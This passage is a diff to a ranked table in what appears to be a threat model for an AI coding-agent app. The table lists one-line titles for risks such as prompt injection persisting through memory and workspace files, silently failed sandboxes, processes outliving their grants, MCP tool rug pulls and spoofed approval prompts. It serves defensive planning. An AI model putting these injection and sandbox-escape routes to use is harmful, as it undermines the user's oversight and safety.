-| 4 | P7 | A shell that runs unconfined because the sandbox silently failed |
-| 5 | P13 | A repository steering the model through its own files and third-party paths |
-| 6 | P47 | Permissions widened by a workspace file, a generalised "allow always", or rule precedence |
-| 7 | P19 | One injection persisting through memory, skills, routines or other steering stores, by any writer |
-| 8 | P45 | Injected text returning unlabelled through recall, wrap-up and notes |
-| 9 | P18 | Laundering an instruction through a workspace file written by any process |
-| 10 | P46 | An approved memory carrying an injected host or command forever |
-| 11 | P44 | An add-on agent running a repository's own hooks and servers before any card appears |
-| 12 | P29 | An add-on agent's own tools acting outside the workspace, where a sandbox can hold them |
-| 13 | P42 | Controls that pass review but leak; it also measures P14's ask rate |
-| 14 | P41 | A changed routine running unattended with its old grants, or reaching undeclared URLs |
-| 15 | P2 | An allowed command carrying a payload through shell syntax or wildcard expansion |
+| 4 | P13 | A repository steering the model through its own files and third-party paths |
+| 5 | P44 | An add-on agent running a repository's own hooks and servers before any card appears |
+| 6 | P19 | One injection persisting through memory, skills, routines or other steering stores, by any writer |
+| 7 | P42 | Controls that pass review but leak; it also measures the ask rate of P14, P52 and P13 |
+| 8 | P7 | A shell that runs unconfined because the sandbox silently failed |
+| 9 | P47 | Permissions widened by a workspace file, a generalised "allow always", rule precedence, or a built-in ask turned off for good |
+| 10 | P45 | Injected text returning unlabelled through recall, wrap-up and notes |
+| 11 | P18 | Laundering an instruction through a workspace file written by any process |
+| 12 | P46 | An approved memory carrying an injected host or command forever |
+| 13 | P41 | A changed routine running unattended with its old grants, or reaching undeclared URLs |
+| 14 | P2 | An allowed command carrying a payload through shell syntax, wildcard expansion or an option a rule's wildcard matched |
+| 15 | P54 | The app opening `file:` and custom-scheme URLs from servers, agents or notes |
 | 16 | P8 | Hooks and repository configuration planted inside the workspace |
 | 17 | P48 | Persistence planted in startup files, launch agents or the app's own configuration |
 | 18 | P23 | Commands using the user's agent sockets, tokens or secret store |
 | 19 | P55 | Keys left in scheduler files readable by other users |
 | 20 | P10 | The sandbox reading home files that no deny list names |
 | 21 | P50 | Processes outliving their grant, their session or the app |
-| 22 | P51 | Fork bombs, memory balloons and full disks |
-| 23 | P40 | Spend overruns, cap races and unpriced models |
-| 24 | P12 | ACP output, sub-agent results, screenshots and MCP prompts reaching the model unlabelled |
-| 25 | P20 | Imported content injected or offered before review |
-| 26 | P52 | Free reads of signed-in sites, page clipboard writes and autofill on look-alike pages |
-| 27 | P53 | A compromised browser helper attacking the app through its channel |
-| 28 | P33 | The helper's browser process running with the user's full reach |
-| 29 | P36 | Downgraded, frozen or forged updates, and a leaked update key with no rotation |
-| 30 | P38 | Unreviewed dependencies and a release triggered by a builder agent |
-| 31 | P37 | Test-only features or debugging switches in a release |
-| 32 | P54 | The app opening `file:` and custom-scheme URLs from servers, agents or notes |
+| 22 | P29 | An add-on agent's own tools acting outside the workspace, where a sandbox can hold them |
+| 23 | P51 | Fork bombs, memory balloons and full disks |
+| 24 | P40 | Spend overruns, cap races and unpriced models, loopback proxies to paid providers included |
+| 25 | P12 | ACP output, sub-agent results, screenshots and MCP prompts reaching the model unlabelled |
+| 26 | P20 | Imported content injected or offered before review |
+| 27 | P52 | Free reads of signed-in sites, page clipboard writes and autofill on look-alike pages |
+| 28 | P53 | A compromised browser helper attacking the app through its channel |
+| 29 | P33 | The helper's browser process running with the user's full reach |
+| 30 | P36 | Downgraded, frozen or forged updates, and a leaked update key with no rotation |
+| 31 | P38 | Unreviewed dependencies and a release triggered by a builder agent |
+| 32 | P37 | Test-only features or debugging switches in a release |
 | 33 | P15 | Remote images and links leaking data from rendered output |
 | 34 | P3 | Destructive commands under permissive modes |
-| 35 | P11 | The app's own git reads running repository programs, and Commit running planted hooks unseen |
+| 35 | P11 | The app's own git reads running repository programs, and Commit running planted hooks unseen or unsandboxed |
 | 36 | P27 | Unpinned MCP server code and stdio servers with full user reach |
 | 37 | P25 | MCP tool rug pulls and shadowing |
 | 38 | P26 | MCP sampling spend and secrets typed into server forms unawares |
 | 39 | P28 | Outside agents writing memory or reading sessions through `unidex serve` |
-| 40 | P4 | Ask cards that hide or misstate the command |
-| 41 | P49 | CLI asks spoofed by output or pre-filled input |
-| 42 | P58 | Approval fatigue from flooded asks |
-| 43 | P5 | Sub-agents with more power than their parent |
-| 44 | P6 | Forged tool calls under the prompt-based protocol |
-| 45 | P59 | Turns that continue after the prompt lost its labels |
-| 46 | P9 | Races, Windows path forms and link tricks in the file guard |
-| 47 | P22 | Keys sent to a provider host that was changed |
-| 48 | P21 | Secrets reaching the model through tool results |
-| 49 | P16 | Terminal escapes writing the clipboard or typing into the shell |
-| 50 | P17 | Deep links that start turns |
-| 51 | P24 | Oversized responses and plain-HTTP provider endpoints |
-| 52 | P57 | Keys in crash dumps and trace logs |
-| 53 | P56 | Background-role models running tools on exposed content |
-| 54 | P39 | Private files readable by other local users |
-| 55 | P60 | Permissive defaults in a new workspace |
-| 56 | P30 | Misleading permission labels from add-on agents |
-| 57 | P35 | Browser rules the Electron app learned the hard way |
-| 58 | P32 | A local process driving the signed-in browser through a debugging port |
-| 59 | P34 | Demoted to a backstop: public pages reaching local services, if Chromium's own rules leave gaps |
-| 60 | P31 | Withdrawn: nothing further to decide |
+| 40 | P61 | Memory and recall content reaching outside agents unlabelled through `unidex serve` |
+| 41 | P4 | Ask cards that hide or misstate the command, or the data a request would carry out |
+| 42 | P49 | CLI asks spoofed by output or pre-filled input |
+| 43 | P58 | Approval fatigue from flooded asks |
+| 44 | P5 | Sub-agents with more power than their parent |
+| 45 | P6 | Forged tool calls under the prompt-based protocol |
+| 46 | P59 | Turns that continue after the prompt lost its labels |
+| 47 | P9 | Races, Windows path forms and link tricks in the file guard |
+| 48 | P22 | Keys sent to a provider host that was changed |
+| 49 | P21 | Secrets reaching the model through tool results |
+| 50 | P16 | Terminal escapes writing the clipboard or typing into the shell |
+| 51 | P17 | Deep links that start turns |
+| 52 | P24 | Oversized responses and plain-HTTP provider endpoints |
+| 53 | P57 | Keys in crash dumps and trace logs |
+| 54 | P56 | Background-role models running tools on exposed content |
+| 55 | P39 | Private files readable by other local users |
+| 56 | P60 | Permissive defaults in a new workspace |
+| 57 | P30 | Misleading permission labels from add-on agents |
+| 58 | P35 | Browser rules the Electron app learned the hard way |
+| 59 | P32 | A local process driving the signed-in browser through a debugging port |
+| 60 | P34 | Demoted to a backstop: public pages reaching local services, if Chromium's own rules leave gaps |
+| 61 | P31 | Withdrawn: nothing further to decide |
 
 ## 9. How this document is maintained
 
